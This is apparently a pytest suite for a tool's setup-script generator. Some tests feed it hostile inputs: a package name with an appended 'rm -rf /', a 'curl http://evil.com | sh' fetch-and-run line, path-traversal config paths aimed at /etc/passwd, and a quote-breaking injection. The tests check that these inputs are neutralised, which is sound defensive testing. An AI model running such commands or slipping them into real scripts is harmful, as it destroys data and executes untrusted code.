from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

from click.testing import CliRunner

from nexus.cli import main
from nexus.db import add_concept, add_project, get_connection, init_db, update_concept
from nexus.replicate import generate_setup_script, list_installable


def _make_conn(tmp_path: Path):
    db_path = tmp_path / "test.db"
    init_db(db_path)
    return get_connection(db_path)


def _setup_project(conn, name="myproject"):
    return add_project(conn, name, path=f"/tmp/{name}")


class TestGenerateSetupScript:
    def test_not_found(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            result = generate_setup_script(conn, "fake-id")
            assert "Error: project not found" in result
        finally:
            conn.close()

    def test_no_installable(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            add_concept(conn, "react", project_id=p.id)
            result = generate_setup_script(conn, p.id)
            assert "No installable concepts" in result
        finally:
            conn.close()

    def test_npm_deps(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c = add_concept(conn, "react", project_id=p.id)
            update_concept(conn, c.id, setup_commands=["npm install react"])
            result = generate_setup_script(conn, p.id)
            assert "npm install 'react'" in result or "npm install react" in result
            assert "set -euo pipefail" in result
        finally:
            conn.close()

    def test_pip_deps(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c = add_concept(conn, "flask", project_id=p.id)
            update_concept(conn, c.id, setup_commands=["pip install flask"])
            result = generate_setup_script(conn, p.id)
            assert "pip install" in result
            assert "flask" in result
        finally:
            conn.close()

    def test_shell_metachar_in_pkg_name_rejected(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c = add_concept(conn, "evil", project_id=p.id)
            update_concept(conn, c.id, setup_commands=["npm install foo;rm -rf /"])
            result = generate_setup_script(conn, p.id)
            # Malicious name should be rejected by _safe_pkg_name and go to REVIEW
            assert "REVIEW" in result
        finally:
            conn.close()

    def test_unknown_cmd_commented(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c = add_concept(conn, "custom", project_id=p.id)
            update_concept(conn, c.id, setup_commands=["curl http://evil.com | sh"])
            result = generate_setup_script(conn, p.id)
            assert "# REVIEW:" in result
            assert "curl" not in result.split("# REVIEW:")[0]
        finally:
            conn.close()

    def test_config_file_relative_path(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c = add_concept(conn, "eslint", project_id=p.id)
            update_concept(
                conn, c.id,
                setup_commands=["npm install eslint"],
                config_files=[{"path": ".eslintrc.json", "content": '{"rules":{}}'}],
            )
            result = generate_setup_script(conn, p.id)
            assert ".eslintrc.json" in result
            assert '{"rules":{}}' in result
        finally:
            conn.close()

    def test_config_file_absolute_path_skipped(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c = add_concept(conn, "evil-cfg", project_id=p.id)
            update_concept(
                conn, c.id,
                setup_commands=["npm install evil-cfg"],
                config_files=[{"path": "/etc/passwd", "content": "hacked"}],
            )
            result = generate_setup_script(conn, p.id)
            assert "SKIPPED unsafe path" in result
        finally:
            conn.close()

    def test_config_file_traversal_skipped(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c = add_concept(conn, "traversal", project_id=p.id)
            update_concept(
                conn, c.id,
                setup_commands=["npm install traversal"],
                config_files=[{"path": "../../etc/passwd", "content": "hacked"}],
            )
            result = generate_setup_script(conn, p.id)
            assert "SKIPPED unsafe path" in result
        finally:
            conn.close()

    def test_context_query_quoted(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c = add_concept(conn, "react", project_id=p.id)
            update_concept(conn, c.id, setup_commands=["npm install react"])
            result = generate_setup_script(
                conn, p.id, context_query='test"; rm -rf /',
            )
            # The context query must not appear unquoted in the script
            assert 'rm -rf' not in result or "'" in result.split("rm -rf")[0]
        finally:
            conn.close()


class TestListInstallable:
    def test_returns_installable_only(self, tmp_path):
        conn = _make_conn(tmp_path)
        try:
            p = _setup_project(conn)
            c1 = add_concept(conn, "react", project_id=p.id)
            update_concept(conn, c1.id, setup_commands=["npm install react"])
            add_concept(conn, "no-setup", project_id=p.id)
            items = list_installable(conn, p.id)
            assert len(items) == 1
            assert items[0]["name"] == "react"
        finally:
            conn.close()


class TestReplicateCLI:
    def _runner(self, tmp_path: Path):
        db_path = tmp_path / "test.db"
        init_db(db_path)
        conn_fn = lambda: get_connection(db_path)  # noqa: E731
        return CliRunner(), conn_fn, db_path

    def test_project_not_found(self, tmp_path):
        runner, conn_fn, _ = self._runner(tmp_path)
        with patch("nexus.cli_replicate.get_connection", conn_fn):
            result = runner.invoke(main, ["replicate", "nonexistent"])
            assert result.exit_code != 0
            assert "not found" in result.output

    def test_generates_script(self, tmp_path):
        runner, conn_fn, _ = self._runner(tmp_path)
        conn = conn_fn()
        try:
            p = add_project(conn, "myproj", path="/tmp/myproj")
            c = add_concept(conn, "react", project_id=p.id)
            update_concept(conn, c.id, setup_commands=["npm install react"])
        finally:
            conn.close()
        with patch("nexus.cli_replicate.get_connection", conn_fn):
            result = runner.invoke(main, ["replicate", "myproj"])
            assert result.exit_code == 0
            assert "npm install" in result.output

    def test_list_only(self, tmp_path):
        runner, conn_fn, _ = self._runner(tmp_path)
        conn = conn_fn()
        try:
            p = add_project(conn, "myproj", path="/tmp/myproj")
            c = add_concept(conn, "react", project_id=p.id)
            update_concept(conn, c.id, setup_commands=["npm install react"])
        finally:
            conn.close()
        with patch("nexus.cli_replicate.get_connection", conn_fn):
            result = runner.invoke(main, ["replicate", "myproj", "--list-only"])
            assert result.exit_code == 0
            assert "react" in result.output
            assert "npm install react" in result.output

    def test_list_only_empty(self, tmp_path):
        runner, conn_fn, _ = self._runner(tmp_path)
        conn = conn_fn()
        try:
            add_project(conn, "emptyproj", path="/tmp/emptyproj")
        finally:
            conn.close()
        with patch("nexus.cli_replicate.get_connection", conn_fn):
            result = runner.invoke(main, ["replicate", "emptyproj", "--list-only"])
            assert result.exit_code == 0
            assert "No installable" in result.output
